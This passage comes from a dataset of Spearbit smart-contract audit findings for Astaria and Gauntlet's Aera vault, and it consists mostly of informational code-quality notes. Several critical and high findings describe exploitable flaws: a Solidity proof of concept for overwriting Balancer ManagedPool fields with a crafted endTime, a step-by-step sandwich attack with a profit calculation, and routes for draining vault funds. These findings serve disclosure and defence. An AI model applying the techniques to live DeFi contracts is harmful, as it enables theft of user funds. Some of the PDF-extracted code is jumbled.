s.finalAuctionEnd // || s.finalAuctionEnd == uint256(0) ) { The condition in comments is always false as the code already reverts in that case.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "WithdrawProxy and PrivateVault symbols are missing hyphens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The symbol for the WithdrawProxy token is missing a hyphen after the W, which will make the name AST-W0x... instead of AST-W-0x.... Similarly, the symbol for the Private Vault token (in Vault.sol) is missing a hyphen after the V.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Lien cannot be bought out after stack.point.end", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The _getRemainingInterest function reverts with Panic(0x11) when block.timestamp > stack.point.end.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inconsistent strictness of inequalities in isValidRefinance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In isValidRefinance, we check that either: a) newRate < maxNewRate && newEnd >= oldEnd b) newEnd - oldEnd >= minDurationIncrease && newRate <= oldRate We should be consistent in whether we're enforcing the changes are strict inequalities or non-strict inequalities.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Clarify comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Few comments are not clear on what they are referring to: zone: address(this), // 0x20 ... conduitKey: s.CONDUIT_KEY, // 0x120", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove unused files", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "CallUtils.sol is not used anywhere in the codebase.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document privileges and entities holding these privileges", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are certain privileged functionalities in the codebase (recognized through requiresAuth mod- ifier). Currently, we have to refer to tests to identify the setup.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document and ensure that maximum number of liens should not be set greater than 256", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Maximum number of liens in a stack is currently set to 5. While paying for a lien, the index in the stack is casted to uint8. This makes the implicit limit on maximum number of liens to be 256.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "transferWithdrawReserve() can return early when the current epoch is 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If s.currentEpoch == 0, s.currentEpoch - 1 will wrap around to type(uint256).max and we will most probably will drain assets into address(0) in the following block: unchecked { s.withdrawReserve -= WithdrawProxy(withdrawProxy) .drain( s.withdrawReserve, s.epochData[s.currentEpoch - 1].withdrawProxy ) .safeCastTo88(); } But this cannot happen since in the outer if block the condition s.withdrawReserve > 0 indirectly means that s.currentEpoch > 0. The indirect implication above regarding the 2 conditions stems from the fact that s.withdrawReserve has only been set in transferWithdrawReserve() function or processEpoch(). In transferWithdrawReserve() function 78 it assumes a positive value only when s.currentEpoch > uint64(0) and in processEpoch() at the end we are incrementing s.currentEpoch.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "2 of the inner if blocks of processEpoch() check for a condition that has already been checked by an outer if block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following 2 if block checks are redundant: if (address(currentWithdrawProxy) != address(0)) { currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio); } uint256 expected = 0; if (address(currentWithdrawProxy) != address(0)) { expected = currentWithdrawProxy.getExpected(); } Since the condition address(currentWithdrawProxy) != address(0) has already been checked by an outer if block.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "General formatting suggestions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": " PublicVault.sol#L283 : there are extra sourounding paranthesis", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Identical collateral check is performed twice in _createLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In _createLien, a check is performed that the collateralId of the new lien matches the collateralId of the first lien on the stack. if (params.stack.length > 0) { if (params.lien.collateralId != params.stack[0].lien.collateralId) { revert InvalidState(InvalidStates.COLLATERAL_MISMATCH); } } This identical check is performed twice (L383-387 and L389-393).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "checkAllowlistAndDepositCap modifer can be defined to consolidate some of the mint and deposit logic for public vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following code snippet has been used for both mint and deposit endpoints of a public vault: VIData storage s = _loadVISlot(); if (s.allowListEnabled) { require(s.allowList[receiver]); } uint256 assets = totalAssets(); if (s.depositCap != 0 && assets >= s.depositCap) { revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED); }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document why bytes4(0xffffffff) is chosen when CollateralToken acting as a Seaport zone to signal invalid orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "bytes4(0xffffffff) to indicate a Seaport order using this zone is not a valid order.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "CollateralToken.onERC721Received's use of depositFor stack variable is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If we follow the logic of assigning values to depositFor in CollateralToken.onERC721Received, we notice that it will end up being from_. So its usage is redundant.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "onlyOwner modifier can be defined to simplify the codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "releaseToAddress checks whether the msg.sender is an owner of a collateral. CollateralToken already has a modifier onlyOwner(...), so the initial check in releaseToAddress can be delegated to the modifier.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document liquidator's role for the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a lien's term end (stack.point.end <= block.timestamp), anyone can call the liquidate on AstariaRouter. There is no restriction on the msg.sender. The msg.sender will be set as the liquidator and if:  The Seaport auction ends (3 days currently, set by the protocol), they can call liquidatorNFTClaim to claim the NFT.  Or if the Seaport auction settles, the liquidator receives the liquidation fee.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Until ASTARIA_ROUTER gets filed for CollateralToken, CollateralToken can not receive ERC721s safely.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "ASTARIA_ROUTER is not set in the CollateralToken's constructor. So till an entity with an author- ity would file for it, CollateralToken is unable to safely receive an ERC721 token ( whenNotPaused and on- ERC721Received would revert).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "_getMaxPotentialDebtForCollateral might have meant to be an internal function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_getMaxPotentialDebtForCollateral is defined as a public function. underscore which as a convention usually is used for internal or private functions.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "return keyword can be removed from stopLiens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_stopLiens does not return any values but in stopLiens the return statement is used along with the non-existent return value of _stopLiens.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "LienToken's constructor does not set ASTARIA_ROUTER which makes some of the endpoints unfunc- tional", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "LienToken's constructor does not set ASTARIA_ROUTER. That means till an authorized entity calls file to set this parameter, the following functions would be broken/revert:  buyoutLien  _buyoutLien  _payDebt  getBuyout  _getBuyout  _isPublicVault  setPayee, partially broken  _paymentAH  payDebtViaClearingHouse", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document the approval process for a user's CollateralToken before calling commitToLiens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In the _executeCommitment's return statement: IVaultImplementation(c.lienRequest.strategy.vault).commitToLien( c, address(this) ); address(this) is the AstariaRouter. The call here to commitToLien enters into _validateCommitment with AstariaRouter as the receiver and so for it to no revert, the holder would have needed to set the approval for the router previously/beforehand: CT.isApprovedForAll(holder, receiver) // needs to be true 83", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "isValidRefinance's return statement can be reformatted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Currently, it is a bit hard to read the return statement of isValidRefinance.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Withdraw Reserves should always be transferred before Commit to Lien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a new lien is requested, the _beforeCommitToLien() function is called. If the epoch is over, this calls processEpoch(). Otherwise, it calls transferWithdrawReserve(). function _beforeCommitToLien( IAstariaRouter.Commitment calldata params, address receiver ) internal virtual override(VaultImplementation) { VaultData storage s = _loadStorageSlot(); if (timeToEpochEnd() == uint256(0)) { processEpoch(); } else if (s.withdrawReserve > uint256(0)) { transferWithdrawReserve(); } } However, the processEpoch() function will fail if the withdraw reserves haven't been transferred. In this case, it would require the user to manually call transferWithdrawReserve() to fix things, and then request their lien again. Instead, the protocol should transfer the reserves whenever it is needed, and only then call processEpoch().", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove owner() variable from withdraw proxies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a withdrawProxy is deployed, it is created with certain immutable arguments. Two of these values are owner() and vault(), and they will always be equal. They seem to be used interchangeably on the withdraw proxy itself, so should be consolidated into one variable.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Unnecessary checks in _validateCommitment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In _validateCommitment(), we check to confirm that either the sender of the message is adequately qualified to be making the decision to take a lien against the collateral (ie they are the holder, the operator, etc). However, the way this is checked is somewhat roundabout and can be substantially simplified. For example, we check require(operator == receiver); in a block that is only triggered if we've already validated that receiver != operator.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Comment or remove unused function parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted functions above take arguments which are never used. particular signature, comment that argument name, otherwise remove that argument completely. If the function has to have a Additional instances noted in Context above.  LienToken.sol#L726 : LienStorage storage s input parameter is not used in _getRemainingInterest. It can be removed and this function can be pure.  VaultImplementation.sol#L341 : incoming is not used buyoutLien, was this variable meant to be used?", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Zero address check can never fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The details.borrower != address(0) check will never be false in the current system as AstariaRouter.sol#L352-L354 will revert when ownerOf is address(0).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "UX differs between Router.commitToLiens and VaultImplementation.commitToLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The Router function creates the Collateralized Token while the VaultImplementation requires the collateral owner to ERC721.safeTransferFrom to the CollateralToken contract prior to calling.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document what vaults are listed by Astaria", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Anyone can call newPublicVault with epochLength in the correct range to create a public vault.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Simplify nested if/else blocks in for loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are quite a few instances that nested if/else blocks are used in for loops and that is the only block in the for loop. 87 for ( ... ) { if (<CONDITION>) { ... } if else (<CONDITION>) { ... } ... if else (<CONDITION>) { ... } else { revert CustomError(); } }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document the role guardian plays in the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The role of guardian is not documented.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "strategistFee... have not been used can be removed from the codebase.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "strategistFeeNumerator and strategistFeeDenominator are not used except in getStrategist- Fee (which itself also has not been referred to by other contracts). It looks like these have been replaced by the vault fee which gets set by public vault owners when they create the vault.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "redeemFutureEpoch can be called directly from a public vault to avoid using the endpoint from AstariaRouter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "One can call the redeemFutureEpoch endpoint of the vault directly to avoid the extra gas of juggling assets and multiple contract calls when using the endpoint from AstariaRouter.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove unused imports", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If an imported file is not used, it can be removed.  LienToken.sol#L24 : since Base64 is only imported in this file, if not used it can be removed from the code- base.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Reduce nesting by reverting early", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Code following this pattern: if (<CONDITION>) { <BODY> } else { revert(); } can be simplified to remove nesting using custom errors: if (!<CONDITION>) { revert(); } <BODY> or if using require statements, it can be transformed into: require(<CONDITION>) <BODY>", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "assembly can read constant global variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. For instance, highlighted code above have the following pattern: bytes32 slot = WITHDRAW_PROXY_SLOT; assembly { s.slot := slot } Here, WITHDRAW_PROXY_SLOT is a constant which can be used directly in assembly code.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Revert with error messages", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are many instances of require and revert statements being used without an accompanying error message. Error messages are useful for unit tests to ensure that a call reverted due the intended reason, and helps in identifying the root cause.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Mixed use of require and revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Astaria codebase uses a mix of require and revert statements. We suggest only following one of these ways to do conditional revert for standardization.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "tokenURI should revert on non-existing tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "As per ERC721 standard, tokenURI() needs to revert if tokenId doesn't exist. The current code returns empty string for all inputs.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inheriting the same contract twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "VaultImplementation inherits from AstariaVaultBase (reference). Hence, there is no need to inherit AstariaVaultBase in Vault and PublicVault contract as they both inherit VaultImplementation already.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "No need to re-cast variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Code above highlights redundant type castings. ERC721 CT = ERC721(address(COLLATERAL_TOKEN())); ... address(msg.sender) These type castings are casting variables to the same type.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Comments do not match implementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": " Scenario 1 & 2: Comments note where each parameter ends in a packed byte array, or parameter width in bytes. The comments are outdated.  Scenario 3: The unless is not implemented.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Incomplete Natspec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": " LienToken.sol#L616 s, @return missing  LienToken.sol#L738-L750 s, position, @return missing  CollateralToken.sol#L616-L628 tokenId_ missing 93  VaultImplementation.sol#L153-L165 The second * on /** is missing causing the compiler to ignore the Natspec. The Natspec appears to document an old function interface. Params do not match with the function inputs.  VaultImplementation.sol#L298-L310 missing stack and return vaule  AstariaRouter.sol#L75-L77 @param NatSpec is missing for _WITHDRAW_IMPL, _BEACON_PROXY_IMPL and _- CLEARING_HOUSE_IMPL  AstariaRouter.sol#L44-L47 : Leave a comment that AstariaRouter also acts as an IBeacon for different cloned contracts.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Cannot have multiple liens with same parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Lien Ids are computed by hashing the Lien struct itself. This means that no two liens can have the same parameters (e.g. same amount, rate, duration, etc.).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Redundant unchecked can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are no arithmetic operations in these unchecked blocks. For clarity, it can be removed.", "labels": ["Spearbit", "Astaria", "Severity: Informational LienToken.sol#L264,"]}, {"title": "Argument name reuse with different meaning across contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "ken.LienActionEncumber receiver is the lender (the receiver of the LienToken)", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Licensing conflict on inherited dependencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The version of Solmate contracts depended in tne gpl repository on are AGPL Licensed, making the gpl repository adopt the same license. This license is incompatible with the currently UNLICENSED Astaria related contracts.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Important Balancer fields can be overwritten by EndTime", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] 1 bit | // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 32 bits | 64 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }", "labels": ["Spearbit", "Gauntlet", "Severity: Critical Risk"]}, {"title": "sweep function should prevent Treasury from withdrawing pools BPTs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current sweep() implementation allows the vault owner (the Treasury) to sweep any token owned by the vault including BPTs (Balancer Pool Tokens) that have been minted by the Vault during the pools initialDeposit() function call. The current vault implementation does not need those BPTs to withdraw funds because they are passed directly through the AssetManager flow via withdraw()/finalize(). Being able to withdraw BPTs would allow the Treasury to:  Withdraw funds without respecting the time period between initiateFinalization() and finalize() calls.  Withdraw funds without respecting Validator allowance() limits.  Withdraw funds without paying the managers fee for the last withdraw().  finalize the pool, withdrawing all funds and selling valueless BPTs on the market.  Sell or rent out BPTs and withdraw() funds afterwards, thus doubling the funds. Swap fees would not be paid because Treasury could call setManager(newManager), where the new manager is someone controlled by the Treasury, subsequently calling setSwapFee(0) to remove the swap fee, which would be applied during an exitPool() event. Note: Once the BPT is retrieved it can also be used to call exitPool(), as the mustAllowlistLPs check is ignored in exitPool().", "labels": ["Spearbit", "Gauntlet", "Severity: Critical Risk"]}, {"title": "Manager can cause an immediate weight change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. When endTime is set to 2**32 it becomes larger than startTime so the _require(startTime <= endTime, ...) statement will not revert. When endTime is converted to 32 bits it will get a value of 0, so in _calcu- lateWeightChangeProgress() the test if (currentTime >= endTime) ... will be true, causing the weight to immediately reach the end value. This way the Manager can cause an immediate weight change via the updateWeightsGradually() function and open arbitrage opportunities. Note: startTime is also subject to this overflow problem. Note: the same issues occur in the latest version of ManagedPool. Note: This issue has been reported to Balancer by the Spearbit team. 7 Also see the following issues:  Managed Pools are still undergoing development and may contain bugs and/or change significantly  Important fields of Balancer can be overwritten by EndTime contract ManagedPool is BaseWeightedPool, ReentrancyGuard { function updateWeightsGradually(uint256 startTime, uint256 endTime, ... ) { ... uint256 currentTime = block.timestamp; startTime = Math.max(currentTime, startTime); _require(startTime <= endTime, Errors.GRADUAL_UPDATE_TIME_TRAVEL); // will not revert if ,! endTime == 2**32 ... _startGradualWeightChange(startTime, endTime, _getNormalizedWeights(), endWeights, tokens); } function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } function _calculateWeightChangeProgress() private view returns (uint256) { uint256 currentTime = block.timestamp; bytes32 poolState = _getMiscData(); uint256 startTime = poolState.decodeUint32(_START_TIME_OFFSET); uint256 endTime = poolState.decodeUint32(_END_TIME_OFFSET); if (currentTime >= endTime) { // will be true if endTime == (2**32) capped to 32 bits == 0 return FixedPoint.ONE; } else ... ... } }", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "deposit and withdraw functions are susceptible to sandwich attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Transactions calling the deposit() function are susceptible to sandwich attacks where an attacker can extract value from deposits. A similar issue exists in the withdraw() function but the minimum check on the pool holdings limits the attacks impact. Consider the following scenario (swap fees ignored for simplicity): 1. Suppose the Balancer pool contains two tokens, WETH and DAI, and weights are 0.5 and 0.5. Currently, there is 1 WETH and 3k DAI in the pool and WETH spot price is 3k. 2. The Treasury wants to add another 3k DAI into the Aera vault, so it calls the deposit() function. 3. The attacker front-runs the Treasurys transaction. They swap 3k DAI into the Balancer pool and get out 0.5 WETH. The weights remain 0.5 and 0.5, but because WETH and DAI balances become 0.5 and 6k, WETHs spot price now becomes 12k. 4. Now, the Treasurys transaction adds 3k DAI into the Balancer pool and upgrades the weights to 0.5*1.5: 0.5 = 0.6: 0.4. 5. The attacker back-runs the transaction and swaps the 0.5 WETH they got in step 3 back to DAI (and recovers the WETHs spot price to near but above 3k). According to the current weights, they can get 9k*(1 - 1/r) = 3.33k DAI from the pool, where r = (20.4)(1/0.6). 6. As a result the attacker profits 3.33k - 3k = 0.33k DAI.", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "allowance() doesnt limit withdraw()s", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The allowance() function is meant to limit withdraw amounts. However, allowance() can only read and not alter state because its visibility is set to view. Therefore, the withdraw() function can be called on demand until the entire Vault/Pool balance has been drained, rendering the allowance() function ineffective. function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory allowances = validator.allowance(); ... for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable(... ); } } } // can't update state due to view function allowance() external view override returns (uint256[] memory amounts) { amounts = new uint256[](count); for (uint256 i = 0; i < count; i++) { amounts[i] = ANY_AMOUNT; } } from both IWithdrawal-", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "Malicious manager could cause Vault funds to be inaccessible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The calculateAndDistributeManagerFees() function pushes tokens to the manager and if for unknown reasons this action fails the entire Vault would be blocked and funds become inaccessible. This occurs because the following functions depend on the execution of calculateAndDistributeManagerFees(): deposit(), withdraw(), setManager(), claimManagerFees(), initiateFinalization(), and therefore final- ize() as well. Within calculateAndDistributeManagerFees() the function safeTransfer() is the riskiest and could fail under the following situations:  A token with a callback is used, for example an ERC777 token, and the callback is not implemented correctly.  A token with a blacklist option is used and the manager is blacklisted. For example USDC has such blacklist functionality. Because the manager can be an unknown party, a small risk exist that he is 